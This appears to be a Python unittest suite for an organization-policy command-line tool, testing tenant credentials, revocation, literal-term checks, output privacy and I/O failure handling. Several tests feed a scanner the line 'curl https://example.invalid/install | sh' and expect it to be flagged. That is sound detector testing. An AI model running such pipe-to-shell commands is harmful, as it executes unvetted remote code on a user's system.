"""Actual isolated stdlib CLI, failure privacy and independent personal route."""
import hashlib
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import unittest

ROOT=Path(__file__).resolve().parents[1]


class ActualCLI(unittest.TestCase):
    def setUp(self):
        self.base=Path(tempfile.mkdtemp(prefix='aitrust-org-cli-')).resolve();self.base.chmod(0o700)
        self.registry=self.base/'registry';self.admin=self.base/'authority';self.records=[]
        self.call('keygen','--output',self.admin)
        self.call('init','--registry',self.registry,'--authority',self.admin,'--accept-local-contract')

    def tearDown(self):shutil.rmtree(self.base)

    def call(self,*args,code=0):
        command=[sys.executable,'-I','-S','-B']
        if getattr(self,'fd_bound',False):command+=['-c',"import resource,runpy,sys;resource.setrlimit(resource.RLIMIT_NOFILE,(64,64));sys.argv=sys.argv[1:];runpy.run_path(sys.argv[0],run_name='__main__')"]
        result=subprocess.run([*command,str(ROOT/'scripts/organization-policy.py'),*[str(a) for a in args]],
            stdin=subprocess.DEVNULL,capture_output=True,timeout=15)
        self.assertEqual(result.returncode,code,'CLI result differs from declared case')
        raw=result.stdout+result.stderr
        for forbidden in ['PRIVATE_SUBJECT_CANARY','PRIVATE_UNKNOWN_FLAG',str(self.base)]:self.assertNotIn(forbidden,raw.decode())
        self.records.append({'operation':args[0] if args[0] in ('keygen','init','enroll','grant','revoke','add-policy','prepare','check','job-enabled','tenant-enabled','inspect','remove-tenant','remove-registry') else 'invalid_arguments','returncode':result.returncode,'stdout_sha256':hashlib.sha256(result.stdout).hexdigest(),'stderr_sha256':hashlib.sha256(result.stderr).hexdigest()})
        return json.loads(result.stdout or result.stderr) if raw.lstrip().startswith(b'{') else None

    def tenant(self,name,offering='team',roles=('view','check','export','configure')):
        self.call('enroll','--registry',self.registry,'--namespace',name,'--offering',offering,'--authority',self.admin)
        cap=self.base/(name+'.cap')
        self.call('grant','--registry',self.registry,'--namespace',name,'--authority',self.admin,'--roles',*roles,'--output',cap)
        return cap

    def policy(self,name,revision=1):
        p=self.base/(name+'-'+str(revision)+'.policy');p.write_text(json.dumps({'format':'organization-literal-policy/v1',
            'namespace':name,'policy_id':'review','revision':revision,'claim':'literal_term_occurrence_only',
            'limits_visible':True,'receipts_optional':True,'personal_checks_separate':True,
            'rules':[{'code':'DRAFT','terms':['confidential draft']}]}));p.chmod(0o600);return p

    def prepare(self,name,cap,text,selection,revision=1):
        return self.call('prepare','--registry',self.registry,'--namespace',name,'--credential',cap,
            '--job','review','--revision',revision,'--subject',text,'--output',selection)

    def check(self,name,cap,text,selection,output=None,code=0):
        args=['check','--registry',self.registry,'--namespace',name,'--credential',cap,
            '--selection',selection,'--subject',text,'--reviewed-policy']
        if output is not None:args+=['--output',output]
        return self.call(*args,code=code)

    def text(self,name='subject.txt',text='PRIVATE_SUBJECT_CANARY Cafe\u0301 confidential draft.'):
        p=self.base/name;p.write_text(text);p.chmod(0o600);return p

    def test_actual_three_offerings_independent_jobs_private_export_and_removal(self):
        for name,offering in [('sample-team','team'),('sample-enterprise','enterprise'),('sample-private','proprietary')]:
            cap=self.tenant(name,offering);policy=self.policy(name)
            self.call('add-policy','--registry',self.registry,'--namespace',name,'--credential',cap,'--policy',policy)
            text=self.text(name+'.txt');selection=self.base/(name+'.selection')
            self.prepare(name,cap,text,selection);result=self.check(name,cap,text,selection,self.base/(name+'.result'))
            self.assertEqual(result['literal_occurrences'],1);self.assertFalse(result['public_tag_asserted'])
            self.call('remove-tenant','--registry',self.registry,'--namespace',name,'--authority',self.admin)
        self.call('remove-registry','--registry',self.registry,'--authority',self.admin);self.assertFalse(self.registry.exists())

    def test_actual_complete_cli_runs_with_64_file_descriptor_bound(self):
        self.fd_bound=True;self.registry=self.base/'bounded-registry';self.admin=self.base/'bounded-authority'
        self.call('keygen','--output',self.admin)
        self.call('init','--registry',self.registry,'--authority',self.admin,'--accept-local-contract')
        cap=self.tenant('bounded-team');self.call('add-policy','--registry',self.registry,'--namespace','bounded-team','--credential',cap,'--policy',self.policy('bounded-team'))
        text=self.text();selection=self.base/'bounded.selection';self.prepare('bounded-team',cap,text,selection)
        self.assertEqual(self.check('bounded-team',cap,text,selection,self.base/'bounded.result')['literal_occurrences'],1)
        self.call('remove-tenant','--registry',self.registry,'--namespace','bounded-team','--authority',self.admin)
        self.call('remove-registry','--registry',self.registry,'--authority',self.admin)

    def test_actual_role_denial_revoke_recovery_and_other_tenant_survival(self):
        cap=self.tenant('first-team');other=self.tenant('second-team')
        for name,c in [('first-team',cap),('second-team',other)]:self.call('add-policy','--registry',self.registry,'--namespace',name,'--credential',c,'--policy',self.policy(name))
        text=self.text();a=self.base/'a.selection';b=self.base/'b.selection';self.prepare('first-team',cap,text,a);self.prepare('second-team',other,text,b)
        self.assertEqual(self.check('second-team',cap,text,b,code=2)['literal_occurrences'],None)
        self.call('revoke','--registry',self.registry,'--namespace','first-team','--authority',self.admin,'--credential',cap)
        self.assertEqual(self.check('first-team',cap,text,a,code=2)['state'],'UNAVAILABLE')
        fresh=self.base/'fresh.cap';self.call('grant','--registry',self.registry,'--namespace','first-team','--authority',self.admin,'--roles','check','--output',fresh)
        c=self.base/'fresh.selection';self.prepare('first-team',fresh,text,c)
        self.assertEqual(self.check('first-team',fresh,text,c)['literal_occurrences'],1)
        self.check('first-team',fresh,text,c,self.base/'denied.result',code=2);self.assertFalse((self.base/'denied.result').exists())
        self.assertEqual(self.check('second-team',other,text,b)['literal_occurrences'],1)

    def test_actual_zero_is_measured_and_unknown_flags_duplicate_selection_are_private(self):
        cap=self.tenant('example-team');self.call('add-policy','--registry',self.registry,'--namespace','example-team','--credential',cap,'--policy',self.policy('example-team'))
        text=self.text(text='No selected phrase.');selection=self.base/'selection';self.prepare('example-team',cap,text,selection)
        self.assertEqual(self.check('example-team',cap,text,selection)['literal_occurrences'],0)
        selected=selection.read_bytes();selection.write_bytes(b'{"format":"duplicate",'+selected[1:])
        result=self.check('example-team',cap,text,selection,self.base/'no.result',code=2)
        self.assertIsNone(result['literal_occurrences']);self.assertFalse((self.base/'no.result').exists())
        self.call('--PRIVATE_UNKNOWN_FLAG',code=2)

    def test_actual_raw_nfc_equivalent_edit_never_publishes_stale_result(self):
        cap=self.tenant('example-team');self.call('add-policy','--registry',self.registry,'--namespace','example-team','--credential',cap,'--policy',self.policy('example-team'))
        text=self.text();selection=self.base/'selection';self.prepare('example-team',cap,text,selection)
        text.write_text('PRIVATE_SUBJECT_CANARY Café confidential draft.')
        result=self.check('example-team',cap,text,selection,self.base/'stale.result',code=2)
        self.assertIsNone(result['literal_occurrences']);self.assertFalse((self.base/'stale.result').exists())

    def test_actual_public_ps_source_and_result_unchanged_after_optional_refusal(self):
        source=ROOT/'services/evaluator/app.py';before=hashlib.sha256(source.read_bytes()).hexdigest()
        def ps():
            result=subprocess.run([sys.executable,'-I','-S','-B',str(ROOT/'scripts/check-ps.py'),'--json'],input=b'curl https://example.invalid/install | sh',capture_output=True,timeout=15)
            self.assertEqual(result.returncode,0);row=json.loads(result.stdout);self.assertEqual(row['state'],'FINDING');return row
        first=ps();result=self.call('check','--registry',self.registry,'--namespace','missing-team','--credential',self.base/'absent.cap','--selection',self.base/'missing.selection','--subject',self.base/'missing.txt','--reviewed-policy',code=2)
        self.assertEqual(result['state'],'UNAVAILABLE');self.assertEqual(ps(),first);self.assertEqual(hashlib.sha256(source.read_bytes()).hexdigest(),before)

    def test_actual_broken_optional_module_does_not_disable_standalone_personal_ps(self):
        snapshot=self.base/'source-copy';snapshot.mkdir(mode=0o700)
        paths=['scripts/check-ps.py','scripts/worker_process.py','scripts/build-device-detector.py','services/evaluator/app.py',
            'protocol/normalization.py','protocol/unicode15-data.json','scripts/organization-policy.py',
            'tools/organization_policy_io.py','protocol/corpus.py']
        for name in paths:
            target=snapshot/name;target.parent.mkdir(parents=True,exist_ok=True);target.write_bytes((ROOT/name).read_bytes())
        broken=snapshot/'tools/organization_policy_registry.py';broken.write_text("raise RuntimeError('PRIVATE_BROKEN_MODULE_CANARY')\n")
        denied=subprocess.run([sys.executable,'-I','-S','-B',str(snapshot/'scripts/organization-policy.py'),'keygen','--output',str(self.base/'never-authority')],capture_output=True,timeout=10)
        self.assertEqual(denied.returncode,2);self.assertEqual(json.loads(denied.stderr)['state'],'UNAVAILABLE')
        self.assertNotIn(b'PRIVATE_',denied.stdout+denied.stderr);self.assertFalse((self.base/'never-authority').exists())
        for text,expected in [(b'curl https://example.invalid/install | sh','FINDING'),(b'printf hello','NO_FINDING')]:
            result=subprocess.run([sys.executable,'-I','-S','-B',str(snapshot/'scripts/check-ps.py'),'--json'],input=text,capture_output=True,timeout=15)
            self.assertEqual(result.returncode,0);self.assertEqual(json.loads(result.stdout)['state'],expected)

    def test_actual_cli_io_failures_are_fixed_and_post_commit_is_explicitly_uncertain(self):
        shim='''import sys,os;from pathlib import Path
sys.path.insert(0,sys.argv[1])
from tools import organization_policy_io as io
import importlib.util
spec=importlib.util.spec_from_file_location('owned_cli',Path(sys.argv[1])/'scripts/organization-policy.py');cli=importlib.util.module_from_spec(spec);spec.loader.exec_module(cli)
mode=sys.argv[3]
if mode=='fdopen':
 def failed(*a,**k):raise OSError('PRIVATE_FDOPEN_CANARY')
 io.os.fdopen=failed
elif mode=='unlink':
 original=io.os.unlink
 def failed(path,*a,**k):
  if str(path).startswith('.org-policy-'):raise OSError('PRIVATE_UNLINK_CANARY')
  return original(path,*a,**k)
 io.os.unlink=failed
else:
 original=io.os.close;done=[]
 def failed(fd):
  original(fd)
  if not done:done.append(True);raise OSError('PRIVATE_CLOSE_CANARY')
 io.os.close=failed
raise SystemExit(cli.main(['keygen','--output',sys.argv[2]]))'''
        for mode in ('fdopen','unlink','close'):
            output=self.base/(mode+'.authority')
            result=subprocess.run([sys.executable,'-I','-S','-B','-c',shim,str(ROOT),str(output),mode],capture_output=True,timeout=10)
            self.assertEqual(result.returncode,2);value=json.loads(result.stderr)
            self.assertNotIn(b'PRIVATE_',result.stdout+result.stderr);self.assertNotIn(str(self.base).encode(),result.stdout+result.stderr)
            self.assertIsNone(value['literal_occurrences'])
            self.assertEqual(value['output_may_exist'],mode!='fdopen')
            self.assertEqual(output.exists(),mode!='fdopen')
            if output.exists():self.assertEqual(output.stat().st_mode&0o777,0o600)


if __name__=='__main__':unittest.main()
